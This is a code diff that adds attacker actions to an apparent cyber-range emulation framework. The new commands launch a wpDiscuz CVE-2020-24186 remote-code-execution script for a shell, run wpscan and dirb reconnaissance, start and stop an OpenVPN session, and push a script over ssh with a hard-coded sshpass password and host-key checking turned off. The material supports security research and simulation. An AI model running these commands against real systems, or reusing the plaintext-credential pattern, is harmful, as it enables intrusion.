@@ -229,3 +229,107 @@ class EmulationAttackerShellActions:
                                        ips=[], action_outcome=EmulationAttackerActionOutcome.PRIVILEGE_ESCALATION_ROOT,
                                        alt_cmds=None, vulnerability=constants.CVE_2015_5602.VULNERABILITY_NAME,
                                        backdoor=True)
+
+    @staticmethod
+    def CVE_2020_24186_EXPLOIT(index: int) -> EmulationAttackerAction:
+        """
+        Launches the CVE-2020-24186 Wordpress wpDiscuz plugin
+
+        :param index: index of the machine to apply the action to
+        :return: the action
+        """
+        id = EmulationAttackerActionId.CVE_2020_24186_EXPLOIT
+        cmd = ["python3 /wpDiscuz_RemoteCodeExec.py -u http://15.16.3.32/ -p /2025/04/07/hello-world/"]
+        return EmulationAttackerAction(id=id, name="CVE-2020-24186 Wordpress wpDiscuz plugin exploit", cmds=cmd,
+                                       type=EmulationAttackerActionType.EXPLOIT,
+                                       descr="Uses the CVE-2020-24186 vulnerability to "
+                                             "obtain a remote shell.",
+                                       index=index,
+                                       ips=["15.16.3.32"], action_outcome=EmulationAttackerActionOutcome.SHELL_ACCESS,
+                                       alt_cmds=None, vulnerability=constants.CVE_2020_24186.VULNERABILITY_NAME,
+                                       backdoor=False)
+
+    @staticmethod
+    def WPSCAN(index: int) -> EmulationAttackerAction:
+        """
+        Perform a WordPress Security Scan
+
+        :param index: index of the machine to apply the action to
+        :return: the created action
+        """
+        id = EmulationAttackerActionId.WPSCAN
+        cmd = ["wpscan --url http://15.16.3.32"]
+        return EmulationAttackerAction(id=id, name="WPScan", cmds=cmd,
+                                       type=EmulationAttackerActionType.RECON,
+                                       descr="Perform a WordPress Security Scan",
+                                       index=index,
+                                       ips=[], action_outcome=EmulationAttackerActionOutcome.INFORMATION_GATHERING, alt_cmds=None,
+                                       backdoor=False)
+        
+    @staticmethod
+    def DIRB(index: int) -> EmulationAttackerAction:
+        """
+        Look for existing (and/or hidden) Web Objects
+
+        :param index: index of the machine to apply the action to
+        :return: the created action
+        """
+        id = EmulationAttackerActionId.DIRB
+        cmd = ["dirb http://15.16.3.32 -r"]
+        return EmulationAttackerAction(id=id, name="dirb", cmds=cmd,
+                                       type=EmulationAttackerActionType.RECON,
+                                       descr="Look for existing (and/or hidden) Web Objects",
+                                       index=index,
+                                       ips=[], action_outcome=EmulationAttackerActionOutcome.INFORMATION_GATHERING, alt_cmds=None,
+                                       backdoor=False)
+
+    @staticmethod
+    def OPENVPN_LOGIN(index: int) -> EmulationAttackerAction:
+        """
+        Login into a openVPN session
+
+        :param index: index of the machine to apply the action to
+        :return: the created action
+        """
+        id = EmulationAttackerActionId.OPENVPN_LOGIN
+        cmd = ["sudo openvpn --config  /vpn-files/openvpn-config-sl001-daniel-cox.ovpn &"]
+        return EmulationAttackerAction(id=id, name="openvpn_login", cmds=cmd,
+                                       type=EmulationAttackerActionType.RECON,
+                                       descr="Login into a openVPN session",
+                                       index=index,
+                                       ips=[], action_outcome=EmulationAttackerActionOutcome.LOGIN, alt_cmds=None,
+                                       backdoor=False)
+
+    @staticmethod
+    def OPENVPN_EXIT(index: int) -> EmulationAttackerAction:
+        """
+        Exit a openVPN session
+
+        :param index: index of the machine to apply the action to
+        :return: the created action
+        """
+        id = EmulationAttackerActionId.OPENVPN_EXIT
+        cmd = ["sudo killall openvpn"]
+        return EmulationAttackerAction(id=id, name="openvpn_exit", cmds=cmd,
+                                       type=EmulationAttackerActionType.RECON,
+                                       descr="Exit a openVPN session",
+                                       index=index,
+                                       ips=[], action_outcome=EmulationAttackerActionOutcome.LOGIN, alt_cmds=None,
+                                       backdoor=False)
+
+    @staticmethod
+    def ROOT_COMMANDS(index: int) -> EmulationAttackerAction:
+        """
+        Exit a openVPN session
+
+        :param index: index of the machine to apply the action to
+        :return: the created action
+        """
+        id = EmulationAttackerActionId.ROOT_COMMANDS
+        cmd = ["echo \"/script.sh\" | sshpass -p \"csle@admin-pw_191\" ssh csle_admin@15.16.3.32 -o StrictHostKeyChecking=no"]
+        return EmulationAttackerAction(id=id, name="root commands", cmds=cmd,
+                                       type=EmulationAttackerActionType.PRIVILEGE_ESCALATION,
+                                       descr="Escalate Priv and commands",
+                                       index=index,
+                                       ips=[], action_outcome=EmulationAttackerActionOutcome.PRIVILEGE_ESCALATION_ROOT, alt_cmds=None,
+                                       backdoor=False)
